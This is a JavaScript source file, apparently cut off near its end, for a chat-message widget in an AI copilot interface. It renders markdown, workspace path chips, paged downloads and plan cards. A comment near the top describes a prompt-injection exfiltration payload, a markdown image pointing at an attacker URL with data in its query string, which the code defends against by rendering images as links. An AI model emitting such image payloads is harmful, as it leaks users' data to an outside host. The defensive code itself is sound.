define([
  'dojo/_base/declare', // Base class for creating Dojo classes
  'dojo/dom-construct', // DOM manipulation utilities
  'dojo/on', // Event handling
  'dojo/topic', // Topic messaging
  'dojo/_base/lang', // Language utilities
  'dojo/Deferred', // Deferred/Promise utilities
  'dojo/request', // HTTP request utilities
  'markdown-it/dist/markdown-it.min', // Markdown parser and renderer
  'markdown-it-link-attributes/dist/markdown-it-link-attributes.min', // Plugin to add attributes to links
  'dijit/Dialog', // Dialog widget
  '../../WorkspaceManager', // Workspace manager for file operations
  './WorkspacePathUtils',
  './PlanCard', // Plan card widget for planning agent
  './ClarificationChips', // Clarification chips for planning agent questions
  './ExecutionBlockedCard', // one-shot "Submit this job" card (plan mode refusals)
  './CursorDownload', // pages data-API downloads past the 25,000-row cap
  './ProgressView' // live progress steps and the "What I did" section
], function (
  declare, domConstruct, on, topic, lang, Deferred, request, markdownit, linkAttributes, Dialog, WorkspaceManager, WorkspacePathUtils, PlanCard, ClarificationChips, ExecutionBlockedCard, CursorDownload, ProgressView
) {
  // A view change (options dialog or the card's toggle) re-renders every
  // open chat through the container.
  ProgressView.onChange(function(variant) {
    topic.publish('copilotProgressStyleChanged', variant);
  });
  /**
   * @class ChatMessage
   * @description Widget that handles rendering individual chat messages with markdown support.
   * Supports system, user and assistant message types with different styling.
   * System messages have collapsible/expandable functionality.
   */
  return declare(null, {
    /** @property {Object} message - Stores the message data including content, role, and ID */
    message: null,

    /** @property {Object} md - Initialized markdown-it instance for rendering markdown content */
    md: (function () {
      var md = markdownit().use(linkAttributes, {
        attrs: {
          target: '_blank',
          rel: 'noopener noreferrer'
        }
      });
      // Render image syntax as an ordinary link, never an <img>. The browser
      // fetches an <img> the moment it renders, so a prompt-injected
      // ![](https://attacker/?d=<data>) in a reply would send data out with
      // no click. Agents never return real images.
      md.renderer.rules.image = function (tokens, idx) {
        var token = tokens[idx];
        var src = token.attrGet('src') || '';
        var label = '[image: ' + (token.content || src) + ']';
        return '<a href="' + md.utils.escapeHtml(src) + '" target="_blank" rel="noopener noreferrer">' +
          md.utils.escapeHtml(label) + '</a>';
      };
      return md;
    })(),

    /** @property {number} fontSize - Stores the font size for the message content */
    fontSize: null,

    /** @property {boolean} copilotEnableShowPromptDetails - Stores the value of the copilotEnableShowPromptDetails flag */
    copilotEnableShowPromptDetails: false,

    /** @property {Object} copilotApi - Reference to CopilotAPI instance for workflow submission */
    copilotApi: null,

    /** @property {string} sessionId - Current session ID for workflow submission context */
    sessionId: null,

    /**
     * @constructor
     * Creates a new ChatMessage instance
     * @param {Object} message - Message object containing content, role and message_id
     * @param {HTMLElement} container - DOM element to render the message into
     */
    constructor: function(message, container) {
      this.message = message;
      this.container = container;
      this.fontSize = message.fontSize || 14; // Get fontSize from message or use default
      this.copilotApi = message.copilotApi || null; // Get copilotApi from message if provided
      this.sessionId = message.sessionId || null; // Get sessionId from message if provided
      this.copilotEnableShowPromptDetails = window.App && window.App.copilotEnableShowPromptDetails === 'true';
      this.renderMessage(); // Immediately render on construction
    },

    /**
     * Escapes HTML special characters to prevent XSS attacks
     * @param {string} text - Text to escape
     * @returns {string} Escaped text safe for innerHTML
     */
    escapeHtml: function(text) {
      if (typeof text !== 'string') {
        return text;
      }
      var div = document.createElement('div');
      div.textContent = text;
      return div.innerHTML;
    },

    _createWorkspacePathChipNode: function(path) {
      var openLink = WorkspacePathUtils.toWorkspaceBrowserUrl(path);
      var chipTag = openLink ? 'a' : 'span';
      var chipAttrs = {
        className: 'workspace-path-chip'
      };
      if (openLink) {
        chipAttrs.href = openLink;
        chipAttrs.target = '_blank';
        chipAttrs.rel = 'noopener noreferrer';
      }
      chipAttrs.title = path;
      var chipNode = domConstruct.create(chipTag, chipAttrs);

      domConstruct.create('i', {
        className: 'fa icon-folder-open-o workspace-path-chip-icon'
      }, chipNode);

      var segments = path.split('/').filter(function(s) { return s; });
      var displayName = segments.length > 0 ? segments[segments.length - 1] : path;

      domConstruct.create('span', {
        className: 'workspace-path-chip-name',
        textContent: displayName
      }, chipNode);

      return chipNode;
    },

    /**
     * Data-API download links in an answer (TSV / FASTA, http_download=true)
     * stop at 25,000 rows on the server.  A plain left click pages through the
     * whole result in the browser instead (CursorDownload); middle-click and
     * copy-link still get the plain link.  Where the browser has the File
     * System Access API (Chrome, Edge) the Save dialog opens first and each
     * page is written to the file as it arrives; elsewhere (Firefox, Safari)
     * the pages are held in memory and saved at the end.
     * @private
     */
    _wireCursorDownloads: function (contentNode) {
      on(contentNode, 'click', lang.hitch(this, function (evt) {
        if (evt.defaultPrevented || evt.button !== 0 || evt.ctrlKey || evt.metaKey || evt.shiftKey || evt.altKey) {
          return;
        }
        var link = evt.target && evt.target.closest ? evt.target.closest('a[href]') : null;
        if (!link || !contentNode.contains(link)) return;
        var href = link.getAttribute('href');
        if (!CursorDownload.canPage(CursorDownload.parseDownloadUrl(href))) return;
        evt.preventDefault();
        if (typeof window.showSaveFilePicker !== 'function') {
          this._runCursorDownload(href, null);
          return;
        }
        // Must be called while the click still counts as a user action, so
        // before anything is fetched.
        window.showSaveFilePicker(CursorDownload.saveOptions(href)).then(lang.hitch(this, function (handle) {
          return handle.createWritable().then(lang.hitch(this, function (writable) {
            this._runCursorDownload(href, { writable: writable, name: handle.name });
          }));
        }), lang.hitch(this, function (err) {
          if (err && err.name === 'AbortError') return; // the Save dialog was closed
          this._runCursorDownload(href, null); // refused (e.g. inside a frame): keep it in memory
        }));
      }));
    },

    /**
     * Runs one paged download with a progress dialog (Cancel).  With a file
     * ({writable, name} from the Save dialog) each page is written as it
     * arrives and a cancelled or failed download discards the file; without
     * one the pages are joined and saved at the end.
     * @private
     */
    _runCursorDownload: function (href, file) {
      var cancelled = false;
      var discarded = false;
      var discard = function () {
        if (file && !discarded) {
          discarded = true;
          file.writable.abort().catch(function () {});
        }
      };
      // Fixed width with wrapping: the long "Download anyway?" text otherwise
      // widened the dialog past the window.
      var box = domConstruct.create('div', { style: 'padding: 16px; width: 380px; max-width: 80vw; box-sizing: border-box;' });
      var status = domConstruct.create('div', {
        style: 'margin-bottom: 12px; font-size: 13px; color: #333; white-space: normal; overflow-wrap: anywhere;'
      }, box);
      var barOuter = domConstruct.create('div', {
        style: 'width: 100%; height: 20px; background: #e0e0e0; border-radius: 4px; overflow: hidden; margin-bottom: 12px;'
      }, box);
      var bar = domConstruct.create('div', {
        style: 'width: 0%; height: 100%; background: #2196F3; transition: width 0.3s ease;'
      }, barOuter);
      var count = domConstruct.create('div', { style: 'margin-bottom: 16px; font-size: 12px; color: #666; text-align: center;' }, box);
      // In-memory path only (Firefox, Safari: no File System Access API).
      if (!file) {
        domConstruct.create('div', {
          style: 'margin-bottom: 12px; font-size: 12px; color: #666; white-space: normal;',
          textContent: 'This browser cannot save straight to a file, so the download is held in memory '
            + 'until it finishes. For very large downloads, Chrome or Edge write the file as it downloads.'
        }, box);
      }
      var buttons = domConstruct.create('div', { style: 'text-align: center;' }, box);
      var cancelBtn = domConstruct.create('button', { type: 'button', class: 'chat-card-btn', textContent: 'Cancel' }, buttons);
      status.textContent = 'Preparing the download…';

      var dlg = new Dialog({
        title: 'Downloading data', content: box, closable: false, style: 'z-index: 10000;'
      });
      var close = function () {
        dlg.hide();
        setTimeout(function () { dlg.destroyRecursive(); }, 300);
      };
      var cancelHandle = on(cancelBtn, 'click', function () {
        cancelled = true;
        discard();
        close();
      });
      dlg.show();

      var fmt = function (n) { return Number(n).toLocaleString(); };
      var finish = function (message) {
        cancelHandle.remove();
        status.textContent = message;
        domConstruct.empty(buttons);
        on(domConstruct.create('button', { type: 'button', class: 'chat-card-btn', textContent: 'Close' }, buttons), 'click', close);
      };

      CursorDownload.run(href, {
        fetch: window.fetch.bind(window),
        token: (window.App && window.App.authorizationToken) || null,
        sink: file ? { write: function (text) { return file.writable.write(text); } } : null,
        isCancelled: function () { return cancelled; },
        onProgress: function (rows, total) {
          status.textContent = 'Downloading…';
          if (total) {
            var pct = Math.min(100, Math.round((rows / total) * 100));
            bar.style.width = pct + '%';
            count.textContent = fmt(rows) + ' of ' + fmt(total) + ' rows (' + pct + '%)';
          } else {
            count.textContent = fmt(rows) + ' rows…';
          }
        },
        confirmLarge: function (total) {
          return new Promise(function (resolve) {
            status.textContent = 'This download has ' + fmt(total) + ' rows. Your browser holds it in memory '
                + 'until it is saved, which may be slow or fail on a small machine. Download anyway?';
            domConstruct.empty(buttons);
            on(domConstruct.create('button', {
              type: 'button',
              class: 'chat-card-btn',
              textContent: 'Download',
              style: 'margin-right: 8px;'
            }, buttons), 'click', function () {
              domConstruct.empty(buttons);
              buttons.appendChild(cancelBtn);
              resolve(true);
            });
            on(domConstruct.create('button', { type: 'button', class: 'chat-card-btn', textContent: 'Cancel' }, buttons),
              'click',
              function () {
                cancelled = true;
                close();
                resolve(false);
              });
          });
        }
      }).then(function (result) {
        if (cancelled || !result || result.cancelled) {
          discard();
          return;
        }
        if (!result.rows) {
          discard();
          finish('No rows matched this query, so there is nothing to download.');
          return;
        }
        if (file) {
          return file.writable.close().then(function () {
            bar.style.width = '100%';
            finish('Saved ' + fmt(result.rows) + ' rows to ' + file.name + '.');
          });
        }
        var blobUrl = URL.createObjectURL(new Blob(result.parts, { type: result.mime }));
        var a = domConstruct.create('a', { href: blobUrl, download: result.fileName, style: 'display: none;' }, document.body);
        a.click();
        setTimeout(function () {
          URL.revokeObjectURL(blobUrl);
          domConstruct.destroy(a);
        }, 1000);
        bar.style.width = '100%';
        finish('Saved ' + fmt(result.rows) + ' rows as ' + result.fileName + '.');
      }).then(null, function (err) {
        discard();
        if (cancelled) return;
        finish('The download failed: ' + (err && err.message ? err.message : err)
            + '. The plain link (first 25,000 rows) still works with a middle-click.');
      });
    },

    _decorateWorkspacePaths: function(contentNode) {
      if (!contentNode || typeof contentNode.querySelectorAll !== 'function') {
        return;
      }
      var showTextMask = (window.NodeFilter && window.NodeFilter.SHOW_TEXT) ? window.NodeFilter.SHOW_TEXT : 4;
      var walker = document.createTreeWalker(contentNode, showTextMask, null, false);
      var textNodes = [];
      var currentNode = walker.nextNode();
      while (currentNode) {
        textNodes.push(currentNode);
        currentNode = walker.nextNode();
      }

      textNodes.forEach(lang.hitch(this, function(textNode) {
        if (!textNode || !textNode.nodeValue) {
          return;
        }
        var parentElement = textNode.parentElement;
        if (!parentElement) {
          return;
        }
        var parentTag = parentElement.tagName ? parentElement.tagName.toLowerCase() : '';
        if (parentTag === 'code') {
          // Inline code whose whole text is one workspace path becomes a
          // chip (agents write paths in backticks); code blocks, links and
          // code with anything else in it stay as they are.
          var grandTag = parentElement.parentElement && parentElement.parentElement.tagName
            ? parentElement.parentElement.tagName.toLowerCase() : '';
          var codePath = WorkspacePathUtils.wholePath(parentElement.textContent);
          if (codePath && grandTag !== 'pre' && grandTag !== 'a' && parentElement.parentNode) {
            parentElement.parentNode.replaceChild(this._createWorkspacePathChipNode(codePath), parentElement);
          }
          return;
        }
        if (parentTag === 'pre' || parentTag === 'a' || parentTag === 'script' || parentTag === 'style') {
          return;
        }

        var textValue = textNode.nodeValue;
        var matches = WorkspacePathUtils.findPathMatches(textValue);
        if (!matches.length) {
          return;
        }

        var fragment = document.createDocumentFragment();
        var cursor = 0;
        matches.forEach(lang.hitch(this, function(match) {
          // The chip replaces the path and its quotes, if any.
          if (match.outerStart > cursor) {
            fragment.appendChild(document.createTextNode(textValue.slice(cursor, match.outerStart)));
          }
          fragment.appendChild(this._createWorkspacePathChipNode(match.path));
          cursor = match.outerEnd;
        }));
        if (cursor < textValue.length) {
          fragment.appendChild(document.createTextNode(textValue.slice(cursor)));
        }
        if (textNode.parentNode) {
          textNode.parentNode.replaceChild(fragment, textNode);
        }
      }));
    },

    /**
     * Renders a chat message in the container
     * - Adds appropriate spacing based on if it's the first message
     * - Creates message container with role-based styling
     * - Handles 3 types of messages:
     *   1. Loading indicator (animated dots)
     *   2. System messages (collapsible)
     *   3. User/Assistant messages (standard display)
     */
    renderMessage: function() {
      // Hide auto-generated plan action user messages ("Execute plan step: ...",
      // "Execute approved plan: ...", etc.). These are system-triggered, not
      // user-typed, and clutter the chat. The plan card shows step progress.
      if (this.message && this.message.role === 'user') {
        var content = (typeof this.message.content === 'string') ? this.message.content : '';
        if (content.match(/^(Execute plan step:|Execute approved plan:|Skip step and continue|Continue after review)/)) {
          return;  // Don't render these auto-generated messages
        }
      }

      // Omit empty assistant messages (common during planning/clarification flows).
      // We only skip if there's no visible content and no card to render.
      if (this.message && this.message.role === 'assistant') {
        var hasText = typeof this.message.content === 'string' && this.message.content.trim() !== '';
        var hasWidget = !!(
          this.message.card ||
          this.message.workflow ||
          this.message.workflowData
        );
        if (!hasText && !hasWidget) {
          return;
        }
      }

      // Add more top margin for first message, less for subsequent
      var marginTop = this.container.children.length === 0 ? '20px' : '5px';

      // Create main message container with role-based styling.
      // user_clarification is rendered as an "Answered Questions" widget.
      var messageRoleClass = this.message.role;
      if (this.message.role === 'user_clarification') {
        messageRoleClass = 'user_clarification answered-questions';
      }

      var messageDiv = domConstruct.create('div', {
        class: 'message ' + messageRoleClass,
        style: 'margin-top: ' + marginTop + ';'
      }, this.container);

      if (this.message.role === 'system') {
        if (this.copilotEnableShowPromptDetails) {
          this.renderSystemMessage(messageDiv);
        }
      } else if (this.message.role === 'status') {
        this.renderStatusMessage(messageDiv);
      } else if (this.message.role === 'user_clarification') {
        this.renderAnsweredQuestionsMessage(messageDiv);
      } else {
        this.renderUserOrAssistantMessage(messageDiv);
      }
    },

    /**
     * Renders a collapsible system message with show/hide functionality
     * - Initially collapsed showing placeholder text
     * - Expands to show full markdown content
     * - Includes toggle button to expand/collapse
     * - Animates height transition
     * @param {HTMLElement} messageDiv - Container to render system message into
     */
    renderSystemMessage: function(messageDiv) {
      // Create a simple button
      var showDocsButton = domConstruct.create('button', {
        innerHTML: 'Show Prompt Details',
        class: 'show-docs-button'
      }, messageDiv);

      // Handle button click
      on(showDocsButton, 'click', function() {
        // Create dialog to show markdown content
        var dialogContent = this.createSystemDialogContent(this.message);
        dialogContent.className = 'systemDialogContent';

        var docsDialog = new Dialog({
          title: "Retrieved Documents",
          style: "width: 600px; max-height: 80vh;",
          content: dialogContent
        });

        // Add close button
        var buttonContainer = document.createElement('div');
        buttonContainer.className = 'systemDialogButtonContainer';

        var closeButton = document.createElement('button');
        closeButton.innerHTML = "Close";
        closeButton.className = 'systemDialogCloseButton';

        closeButton.onclick = function() {
          docsDialog.hide();
          docsDialog.destroy();
        };

        buttonContainer.appendChild(closeButton);
        docsDialog.containerNode.appendChild(buttonContainer);

        docsDialog.startup();
        docsDialog.show();
      }.bind(this));
    },

    /**
     * Renders a status message with distinctive styling
     * - Shows agent/tool activity and progress
     * - Smaller text, gray background
     * - Left-aligned, compact layout
     * - No action buttons
     * @param {HTMLElement} messageDiv - Container to render status message into
     */
    renderStatusMessage: function(messageDiv) {
      var statusContentNode = domConstruct.create('div', {
        class: 'status-content'
      }, messageDiv);
      ProgressView.render(statusContentNode, {
        steps: Array.isArray(this.message.steps) ? this.message.steps : [],
        messageId: this.message.message_id,
        startedAt: this.message.started_at || null,
        fallbackText: this.message.content || ''
      });
    },

    /**
     * "What I did": the turn's steps under a finished assistant message,
     * closed by default (agent_metadata.steps, saved by the gateway).
     */
    renderProgressSummary: function(messageDiv) {
      var meta = this.message.agent_metadata;
      var steps = meta && Array.isArray(meta.steps) ? meta.steps : null;
      if (!steps || !steps.length) return;
      var node = domConstruct.create('div', { class: 'progress-summary' }, messageDiv);
      ProgressView.renderSummary(node, {
        steps: steps,
        messageId: this.message.message_id,
        elapsedMs: meta.elapsed_ms || null
      });
    },

    /**
     * Renders a standard user or assistant message
     * - Simply displays markdown content in a styled container
     * - No collapsible functionality
     * - For workflow messages, shows a "Review Workflow" button instead
     * @param {HTMLElement} messageDiv - Container to render message into
     */
    renderAnsweredQuestionsMessage: function(messageDiv) {
      var answers = Array.isArray(this.message.clarificationAnswers)
        ? this.message.clarificationAnswers
        : [];

      // Fallback for older persisted sessions (content contains markdown list).
      if (answers.length === 0 && typeof this.message.content === 'string') {
        this.renderUserOrAssistantMessage(messageDiv);
        return;
      }

      var container = domConstruct.create('div', {
        class: 'answered-questions-container'
      }, messageDiv);

      domConstruct.create('div', {
        class: 'answered-questions-header',
        innerHTML: 'Answered Questions'
      }, container);

      var list = domConstruct.create('div', {
        class: 'answered-questions-list'
      }, container);

      answers.forEach(lang.hitch(this, function(a, idx) {
        var q = (a && a.question) ? String(a.question) : ('Question ' + (idx + 1));
        var ans = (a && a.answer) ? String(a.answer) : '(no answer)';

        var row = domConstruct.create('div', {
          class: 'answered-questions-row'
        }, list);

        domConstruct.create('div', {
          class: 'answered-questions-q',
          innerHTML: this.escapeHtml(q)
        }, row);

        domConstruct.create('div', {
          class: 'answered-questions-a',
          innerHTML: this.escapeHtml(ans)
        }, row);
      }));

      // Action buttons (copy + retry) below the widget.
      var actionsBar = domConstruct.create('div', {
        class: 'user-message-actions'
      }, messageDiv);
      this.createUserMessageActionButtons(actionsBar);

      this.renderAttachments(messageDiv);
    },

    renderUserOrAssistantMessage: function(messageDiv) {
      // Always render assistant/user text first, then append any tool UI widgets below.
      var isUser = this.message.role === 'user' || this.message.role === 'user_clarification';
      var contentParent = messageDiv;
      if (isUser) {
        // Bubble holds text + attachments; action buttons stay outside so they
        // sit below the colored background rather than inside it.
        contentParent = domConstruct.create('div', {
          class: 'user-message-bubble'
        }, messageDiv);
      }

      var contentToRender = '';
      if (this.message.content) {
        if (typeof this.message.content === 'string') {
          contentToRender = this.message.content;
        } else {
          console.warn('[ChatMessage] ⚠ Content is not a string, converting to string. Type:', typeof this.message.content);
          console.warn('[ChatMessage] Content value:', this.message.content);

          // Convert to string - if it's an object, stringify it
          contentToRender = typeof this.message.content === 'object'
            ? JSON.stringify(this.message.content, null, 2)
            : String(this.message.content);
        }
      }

      if (contentToRender) {
        var contentContainer;
        if (isUser) {
          // Render user messages as plain text so characters like '>'
          // (FASTA headers) are not consumed by the markdown parser.
          contentContainer = domConstruct.create('div', {
            innerHTML: this.escapeHtml(contentToRender),
            class: 'markdown-content user-plain-text',
            style: 'font-size: ' + this.fontSize + 'px;'
          }, contentParent);
        } else {
          contentContainer = domConstruct.create('div', {
            innerHTML: this.md.render(contentToRender),
            class: 'markdown-content',
            style: 'font-size: ' + this.fontSize + 'px;'
          }, contentParent);
          // Process code blocks to make large ones collapsible
          this.makeLargeCodeBlocksCollapsible(contentContainer);
          this._wireCursorDownloads(contentContainer);
        }
        this._decorateWorkspacePaths(contentContainer);
      }

      if (isUser) {
        this.renderAttachments(contentParent);
      } else {
        this.renderProgressSummary(messageDiv);
      }

      // --- Card dispatch ---
      // Only interactive card types are rendered as widgets.
      // Data query, workspace browse, jobs browse, file metadata, and
      // workflow cards have been removed — agents now include actionable
      // markdown links directly in their text responses.
      if (this.message.card && this.message.card.card_type) {
        switch (this.message.card.card_type) {
          case 'plan':
            this.renderPlanCard(messageDiv);
            break;
          case 'clarification':
            this.renderClarificationChips(messageDiv);
            break;
          case 'execution_blocked':
            this.renderExecutionBlockedCard(messageDiv);
            break;
        }
      }

      if (this.message.role === 'assistant') {
        // Create button container for assistant messages
        var buttonContainer = domConstruct.create('div', {
          class: 'message-button-container'
        }, messageDiv);

        // Add copy text button
        this.createMessageActionButtons(buttonContainer);
      }

      if (isUser) {
        // Create action bar below the bubble with copy + retry buttons
        var actionsBar = domConstruct.create('div', {
          class: 'user-message-actions'
        }, messageDiv);

        this.createUserMessageActionButtons(actionsBar);
      }

      if (!isUser) {
        this.renderAttachments(messageDiv);
      }
    },

    renderAttachments: function(messageDiv) {
      if (!Array.isArray(this.message.attachments) || this.message.attachments.length === 0) {
        return;
      }

      var container = domConstruct.create('div', {
        class: 'message-attachments'
      }, messageDiv);

      this.message.attachments.forEach(lang.hitch(this, function(attachment) {
        if (!attachment) return;

        if (attachment.type === 'image') {
          var label = attachment.name || (attachment.source === 'screenshot' ? 'Page screenshot' : 'Attached image');
          domConstruct.create('div', {
            class: 'message-attachment-chip',
            innerHTML: '<i class="fa icon-image"></i> ' + this.escapeHtml(label)
          }, container);
        } else if (attachment.type === 'pdf') {
          var pdfLabel = attachment.name || 'Attached PDF';
          var pdfSizeStr = attachment.size ? ' (' + this._formatFileSize(attachment.size) + ')' : '';
          domConstruct.create('div', {
            class: 'message-attachment-chip',
            innerHTML: '<i class="fa icon-file-pdf-o"></i> ' + this.escapeHtml(pdfLabel) + pdfSizeStr
          }, container);
        } else if (attachment.type === 'file') {
          var fileLabel = attachment.name || 'Attached file';
          var sizeStr = attachment.size ? ' (' + this._formatFileSize(attachment.size) + ')' : '';
          domConstruct.create('div', {
            class: 'message-attachment-chip',
            innerHTML: '<i class="fa icon-file-text-o"></i> ' + this.escapeHtml(fileLabel) + sizeStr
          }, container);
        }
      }));
    },

    _formatFileSize: function(bytes) {
      if (bytes < 1024) return bytes + ' B';
      if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
      return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
    },

    /**
     * Makes large code blocks collapsible, showing only the first 8 lines by default
     * @param {HTMLElement} markdownContainer - Container with rendered markdown content
     */
    makeLargeCodeBlocksCollapsible: function(markdownContainer) {
      var preElements = markdownContainer.querySelectorAll('pre');
      var self = this;

      preElements.forEach(function(preElement) {
        var codeElement = preElement.querySelector('code');
        if (!codeElement) {
          return;
        }

        // Count lines in the code block
        var textContent = codeElement.textContent || codeElement.innerText || '';
        var lines = textContent.split('\n');
        var lineCount = lines.length;

        // Only make collapsible if more than 8 lines
        if (lineCount <= 8) {
          return;
        }

        // Get the full HTML content (preserving any syntax highlighting)
        var fullHtml = codeElement.innerHTML;
        var first8LinesText = lines.slice(0, 8).join('\n');

        // Create wrapper container
        var wrapper = domConstruct.create('div', {
          class: 'collapsible-code-block'
        });

        // Create toggle button
        var toggleButton = domConstruct.create('button', {
          class: 'code-block-toggle',
          innerHTML: '▼ Show more (' + (lineCount - 8) + ' more lines)',
          style: 'display: block; width: 100%; padding: 6px 10px; margin-bottom: 4px; background: #f3f4f6; border: 1px solid #d1d5db; border-radius: 4px; cursor: pointer; font-size: 12px; color: #374151; text-align: left;'
        });

        // Create collapsed view (first 8 lines)
        // Try to preserve syntax highlighting by extracting first 8 lines from HTML
        var collapsedPre = preElement.cloneNode(false);
        collapsedPre.className = preElement.className || '';
        collapsedPre.style.margin = '0';
        var collapsedCode = codeElement.cloneNode(false);

        // For collapsed view, we'll use plain text for the first 8 lines
        // to avoid complex HTML parsing
        collapsedCode.textContent = first8LinesText;
        collapsedPre.appendChild(collapsedCode);

        // Create expanded view (full content) - clone the original
        var expandedPre = preElement.cloneNode(true);
        expandedPre.style.margin = '0';
        expandedPre.style.display = 'none';

        // Add elements to wrapper
        wrapper.appendChild(toggleButton);
        wrapper.appendChild(collapsedPre);
        wrapper.appendChild(expandedPre);

        // Track expanded state
        var isExpanded = false;

        // Toggle functionality
        on(toggleButton, 'click', function() {
          isExpanded = !isExpanded;
          if (isExpanded) {
            collapsedPre.style.display = 'none';
            expandedPre.style.display = 'block';
            toggleButton.innerHTML = '▲ Show less';
          } else {
            collapsedPre.style.display = 'block';
            expandedPre.style.display = 'none';
            toggleButton.innerHTML = '▼ Show more (' + (lineCount - 8) + ' more lines)';
          }
        });

        // Replace the original pre element with the wrapper
        if (preElement.parentNode) {
          preElement.parentNode.replaceChild(wrapper, preElement);
        }
      });
    },

    /**
     * Creates a button element with standard styling
     *
     *
     *
     */
    createMessageActionButtons: function(buttonContainer) {
      var copyButton = this.createButton('', 'copy-button', 'Copy message');
      var thumbUpButton = this.createButton('', 'thumb-up-button', 'Like response');
      var thumbDownButton = this.createButton('', 'thumb-down-button', 'Dislike response');

      // Highlight buttons based on existing rating
      if (this.message.rating === 1) {
        thumbUpButton.classList.add('highlighted');
      } else if (this.message.rating === -1) {
        thumbDownButton.classList.add('highlighted');
      }

      // Add click handler for copy button
      on(copyButton, 'click', lang.hitch(this, function(event) {
        topic.publish('copy-message', this.message.content);
        event.stopPropagation();
      }));

      on(thumbUpButton, 'click', lang.hitch(this, function(event) {
        // topic.publish('thumb-up-message', this.message.content);
        topic.publish('rate-message', {
          message_id: this.message.message_id,
          rating: 1
        });
        event.stopPropagation();
      }));

      on(thumbDownButton, 'click', lang.hitch(this, function(event) {
        // topic.publish('thumb-down-message', this.message.content);
        topic.publish('rate-message', {
          message_id: this.message.message_id,
          rating: -1
        });
        event.stopPropagation();
      }));

      domConstruct.place(copyButton, buttonContainer);
      domConstruct.place(thumbUpButton, buttonContainer);
      domConstruct.place(thumbDownButton, buttonContainer);
    },

    /**
     * Creates copy + retry buttons for user messages.
     * Placed in the action bar below the message bubble.
     */
    createUserMessageActionButtons: function(buttonContainer) {
      var copyButton = this.createButton('', 'copy-button', 'Copy message');

      on(copyButton, 'click', lang.hitch(this, function(event) {
        topic.publish('copy-message', this.message.content);
        event.stopPropagation();
      }));

      var retryButton = this.createButton('', 'retry-button', 'Retry this message');

      on(retryButton, 'click', lang.hitch(this, function(event) {
        var content = this.message.content;
        if (content && typeof content === 'string' && content.trim()) {
          topic.publish('RetryUserMessage', content);
        }
        event.stopPropagation();
      }));

      domConstruct.place(copyButton, buttonContainer);
      domConstruct.place(retryButton, buttonContainer);
    },

    /**
     * Creates a button element with standard styling
     * @param {string} text - The text to display on the button
     * @param {string} [additionalClass] - Optional additional CSS class
     * @returns {HTMLElement} Button element that can be added to a container
     */
    createButton: function(text, additionalClass, tooltip) {
      var className = 'message-action-button' + (additionalClass ? ' ' + additionalClass : '');
      var buttonAttrs = {
        innerHTML: text,
        class: className
      };
      if (tooltip) {
        buttonAttrs.title = tooltip;
      }
      return domConstruct.create('button', buttonAttrs);
    },

    /**
     * Creates collapsible content for system messages using proper DOM construction
     * @param {Object} message - The message object containing content
     * @returns {HTMLElement} DOM container with the system dialog content
     */
    createSystemDialogContent: function(message) {
      var container = domConstruct.create('div');

      // Create collapsible section for message content
      if (message.content) {
        var headerButton1 = domConstruct.create('button', {
          innerHTML: '► System Message Content',
          class: 'collapsible-header'
        }, container);

        var contentDiv1 = domConstruct.create('div', {
          innerHTML: this.md.render(message.content),
          class: 'collapsible-content'
        }, container);

        // Add click handler for toggle functionality
        on(headerButton1, 'click', lang.hitch(this, function() {
          if (contentDiv1.classList.contains('expanded')) {
            contentDiv1.classList.remove('expanded');
            headerButton1.innerHTML = headerButton1.innerHTML.replace('▼', '►');
          } else {
            contentDiv1.classList.add('expanded');
            headerButton1.innerHTML = headerButton1.innerHTML.replace('►', '▼');
          }
        }));
      }

      // Create collapsible section for copilot details if present
      if (message.copilotDetails) {
        var headerButton2 = domConstruct.create('button', {
          innerHTML: '► Copilot Details',
          class: 'collapsible-header'
        }, container);

        var copilotContent;
        if (typeof message.copilotDetails === 'string') {
          copilotContent = this.md.render(message.copilotDetails);
        } else {
          copilotContent = '<pre>' + JSON.stringify(message.copilotDetails, null, 2) + '</pre>';
        }

        var contentDiv2 = domConstruct.create('div', {
          innerHTML: copilotContent,
          class: 'collapsible-content'
        }, container);

        // Add click handler for toggle functionality
        on(headerButton2, 'click', lang.hitch(this, function() {
          if (contentDiv2.classList.contains('expanded')) {
            contentDiv2.classList.remove('expanded');
            headerButton2.innerHTML = headerButton2.innerHTML.replace('▼', '►');
          } else {
            contentDiv2.classList.add('expanded');
            headerButton2.innerHTML = headerButton2.innerHTML.replace('►', '▼');
          }
        }));
      }

      // Check for documents and create collapsible sections for each
      if (message.documents && Array.isArray(message.documents) && message.documents.length > 0) {
        for (var i = 0; i < message.documents.length; i++) {
          var doc = message.documents[i];
          var title = '► Document ' + (i + 1);
          if (doc.title || doc.name) {
            title += ': ' + (doc.title || doc.name);
          }

          var headerButton = domConstruct.create('button', {
            innerHTML: title,
            class: 'collapsible-header'
          }, container);

          var content;
          if (typeof doc === 'string') {
            content = this.md.render(doc);
          } else if (doc.content) {
            content = this.md.render(doc.content);
          } else {
            content = '<pre>' + JSON.stringify(doc, null, 2) + '</pre>';
          }

          var contentDiv = domConstruct.create('div', {
            innerHTML: content,
            class: 'collapsible-content'
          }, container);

          // Add click handler for toggle functionality
          (function(button, div) {
            on(button, 'click', lang.hitch(this, function() {
              if (div.classList.contains('expanded')) {
                div.classList.remove('expanded');
                button.innerHTML = button.innerHTML.replace('▼', '►');
              } else {
                div.classList.add('expanded');
                button.innerHTML = button.innerHTML.replace('►', '▼');
              }
            }));
          }.bind(this))(headerButton, contentDiv);
        }
      }

      return container;
    },

    // ==================== Planning Agent Rendering ====================

    /**
     * Render a PlanCard widget for the planning agent's plan.
     * @param {HTMLElement} parentNode - The message content node to append to.
     */
    renderPlanCard: function (parentNode) {
      try {
        // During live SSE, _applyToolMetadataToAssistantMessage sets planData.
        // When restoring from MongoDB, the plan lives under message.plan or
        // message.card.card_payload instead.  Fall back through all three.
        var planData = this.message.planData
          || this.message.plan
          || (this.message.card && this.message.card.card_payload);
        if (!planData || !planData.steps) {
          console.warn('[ChatMessage] renderPlanCard called without valid planData');
          return;
        }

        var planCard = new PlanCard({
          plan: planData,
          copilotApi: this.copilotApi || null,
          sessionId: this.message.session_id || this.sessionId || null,
          completedResults: {}
        });

        var cardContainer = domConstruct.create('div', {
          'class': 'plan-card-container'
        }, parentNode);

        planCard.placeAt(cardContainer);
        planCard.startup();

        // Render inline chat action block for draft plans
        this._renderPlanActionBlock(parentNode, planData, planCard);
      } catch (e) {
        console.error('[ChatMessage] Error rendering plan card:', e);
      }
    },

    /**
     * Render an inline action block below the PlanCard for draft plans.
     * Shows Approve & Execute, Edit Plan, and Regenerate buttons.
     * After the user acts, the block updates to show the chosen action.
     */
